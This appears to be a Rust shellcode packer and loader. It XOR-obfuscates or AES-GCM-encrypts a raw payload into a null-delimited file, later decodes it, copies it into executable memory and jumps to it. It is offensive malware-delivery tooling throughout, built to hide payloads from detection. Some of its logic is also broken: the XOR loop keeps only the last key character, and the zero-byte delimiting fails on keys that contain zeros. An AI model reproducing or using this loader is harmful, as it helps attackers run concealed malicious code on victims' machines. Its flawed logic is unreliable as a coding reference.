use mmap_fixed::MapOption::*;
use std::fs::OpenOptions;
use std::io::Write;
use std::mem;

use aes_gcm::{
    aead::{AeadInPlace, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};

use rand::{
    distributions::{Alphanumeric, Uniform},
    Rng,
};

#[derive(Clone)]
pub struct ShellCode {
    pub sc: Vec<u8>,
}

#[derive(Clone)]
pub struct XoredShellCode {
    pub sc: ShellCode,
    pub xor_key: String,
}

#[derive(Clone)]
pub struct AESShellCode {
    pub sc: ShellCode,
    pub nonce: Vec<u8>,
    pub assoc_data: Vec<u8>,
    pub key: Vec<u8>,
}

impl ShellCode {
    pub fn from_file(input_path: &str) -> ShellCode {
        let shellcode = match std::fs::read(input_path) {
            Ok(result) => result,
            Err(error) => {
                println!("[+] failed to read  : {:?}", error);
                std::process::exit(0x0100);
            }
        };

        let file_args = shellcode.split(|e| *e == 0).collect::<Vec<_>>();

        if file_args.len() == 1 {
            println!("[+]");
            ShellCode { sc: shellcode }
        } else if std::str::from_utf8(file_args[1]).unwrap() == "m1" {
            println!("[+]");

            let my_xored_shellcode = XoredShellCode {
                sc: ShellCode {
                    sc: file_args[3].to_vec(),
                },
                xor_key: std::str::from_utf8(&file_args[2]).unwrap().to_string(),
            };
            let decrypted_sc = my_xored_shellcode.clone().xor();

            decrypted_sc
        } else if std::str::from_utf8(&file_args[1]).unwrap() == "m2" {
            println!("[+] m2");

            let my_aes_shellcode = AESShellCode {
                sc: ShellCode {
                    sc: file_args[5].to_vec(),
                },
                nonce: file_args[3].to_vec(),
                assoc_data: file_args[4].to_vec(),
                key: file_args[2].to_vec(),
            };

            let decrypted_sc = my_aes_shellcode.decrypt();

            decrypted_sc
        } else {
            println!("[+]");
            ShellCode { sc: shellcode }
        }
    }

    pub fn load(self) {
        let map =
            mmap_fixed::MemoryMap::new(self.sc.len(), &[MapReadable, MapWritable, MapExecutable])
                .unwrap();

        unsafe {
            std::ptr::copy(self.sc.as_ptr(), map.data(), self.sc.len());
            println!("[+] l1");
            let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
            println!("[+]l2");
            exec_shellcode();
        }
    }
}

impl XoredShellCode {
    pub fn new(sc_bytearray: ShellCode) -> XoredShellCode {
        let mut xored_shellcode = sc_bytearray.sc.clone();
        let xor_key: String = rand::thread_rng()
            .sample_iter(&Alphanumeric)
            .take(64)
            .map(char::from)
            .collect();

        println!("[+]");
        println!("[+]");
        for xor_char in xor_key.chars() {
            if xor_char != ' ' {
                for (index, value) in sc_bytearray.sc.iter().enumerate() {
                    std::mem::replace(&mut xored_shellcode[index], value ^ (xor_char as u8 - b'0'));
                }
            }
        }

        XoredShellCode {
            xor_key: xor_key,
            sc: ShellCode {
                sc: xored_shellcode,
            },
        }
    }

    pub fn xor(self) -> ShellCode {
        let mut xored_shellcode = self.sc.sc.clone();
        println!("[+]");
        println!("[+]");
        for xor_char in self.xor_key.chars() {
            if xor_char != ' ' {
                for (index, value) in self.sc.sc.iter().enumerate() {
                    std::mem::replace(&mut xored_shellcode[index], value ^ xor_char as u8 - b'0');
                }
            }
        }

        ShellCode {
            sc: xored_shellcode,
        }
    }

    pub fn output_to_file(self, output_path: &str) {
        let mut file = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_path.clone())
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+]");
                std::process::exit(0x0100);
            }
        };

        let mode = b"m1";
        let mut final_output = vec![0];
        final_output.extend(mode);
        final_output.extend(vec![0]);
        final_output.extend(self.xor_key.as_bytes());
        final_output.extend(vec![0]);
        final_output.extend(&self.sc.sc);

        file.write_all(&final_output).unwrap();
        println!("[+]");
    }
}

impl AESShellCode {
    pub fn new(sc_bytearray: ShellCode) -> AESShellCode {
        let key = Aes256Gcm::generate_key(&mut OsRng).to_vec();
        let cipher = Aes256Gcm::new_from_slice(&key).unwrap();

        let rand_assoc_data: Vec<u8> = rand::thread_rng()
            .sample_iter(Uniform::from(1..255))
            .take(64)
            .collect();
        let rand_nonce: Vec<u8> = rand::thread_rng()
            .sample_iter(Uniform::from(1..255))
            .take(12)
            .collect();
        let nonce = Nonce::from_slice(&rand_nonce);

        let mut sc_copy = sc_bytearray;
        cipher.encrypt_in_place(nonce, &rand_assoc_data, &mut sc_copy.sc);

       

        AESShellCode {
            sc: sc_copy,
            nonce: rand_nonce,
            assoc_data: rand_assoc_data,
            key,
        }
    }

    pub fn decrypt(mut self) -> ShellCode {
      
        let cipher = Aes256Gcm::new_from_slice(&self.key).unwrap();
        let nonce = Nonce::from_slice(&self.nonce);
        cipher.decrypt_in_place(nonce, &self.assoc_data, &mut self.sc.sc);

        self.sc
    }

    pub fn output_to_file(self, output_path: &str) {
        let mut file = match OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(output_path.clone())
        {
            Ok(result) => result,
            Err(_error) => {
                println!("[+]");
                std::process::exit(0x0100);
            }
        };

        let mode = b"m2";
        let mut final_output = vec![0];
        final_output.extend(mode);
        final_output.extend(vec![0]);
        final_output.extend(self.key);
        final_output.extend(vec![0]);
        final_output.extend(&self.nonce);
        final_output.extend(vec![0]);
        final_output.extend(&self.assoc_data);
        final_output.extend(vec![0]);
        final_output.extend(&self.sc.sc);

        file.write_all(&final_output).unwrap();
        println!("[+]");
    }
}
